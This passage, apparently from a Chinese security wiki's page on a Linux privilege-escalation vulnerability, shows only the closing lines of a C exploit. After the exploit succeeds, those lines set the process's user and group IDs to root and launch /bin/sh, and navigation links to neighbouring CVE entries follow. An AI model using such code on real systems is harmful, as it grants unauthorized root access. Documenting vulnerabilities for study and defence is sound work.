<span class="w">    </span><span class="n">printf</span><span class="p">(</span><span class="s">&quot;[+] bl1ng bl1ng! We got it!</span><span class="se">\n</span><span class="s">&quot;</span><span class="p">);</span>
<span class="cp">#ifndef BRUTE</span>
<span class="w">    </span><span class="n">setuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">seteuid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">setgid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span><span class="w"> </span><span class="n">setegid</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a_argv</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">&quot;sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="k">static</span><span class="w"> </span><span class="kt">char</span><span class="w"> </span><span class="o">*</span><span class="n">a_envp</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="s">&quot;PATH=/bin:/usr/bin:/sbin&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="w"> </span><span class="p">};</span>
<span class="w">    </span><span class="n">execv</span><span class="p">(</span><span class="s">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">a_argv</span><span class="p">);</span>
<span class="cp">#endif</span>
<span class="p">}</span>
</code></pre></div>

  <br>
    

    
    
      
    

  <div class="row wm-article-nav-buttons" role="navigation" aria-label="navigation">
    
    <div class="wm-article-nav pull-right">
      <a href="../Linux%20sudo%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22809/" class="btn btn-xs btn-default pull-right">
        Next
        <i class="fa fa-chevron-right" aria-hidden="true"></i>
      </a>
      <a href="../Linux%20sudo%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2023-22809/" class="btn btn-xs btn-link">
        Linux Sudo 权限提升漏洞 CVE-2023-22809
      </a>
    </div>
    
    <div class="wm-article-nav">
      <a href="../Linux%20openvswitch%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2022-2639/" class="btn btn-xs btn-default pull-left">
        <i class="fa fa-chevron-left" aria-hidden="true"></i>
        Previous</a><a href="../Linux%20openvswitch%20%E6%9D%83%E9%99%90%E6%8F%90%E5%8D%87%E6%BC%8F%E6%B4%9E%20CVE-2022-2639/" class="btn btn-xs btn-link">
        Linux openvswitch 权限提升漏洞 CVE-2022-2639
      </a>
    </div>
    
  </div>

    <br>
</div>

<footer class="col-md-12 wm-page-content"><p>Copyright © 2025 SecNN-Wiki</p>
  <p>Documentation built with <a href="http://www.mkdocs.org/">MkDocs</a> using <a href="None">Windmill Dark</a> theme by 内部使用 (noraj).</p>
</footer>

</body>
</html>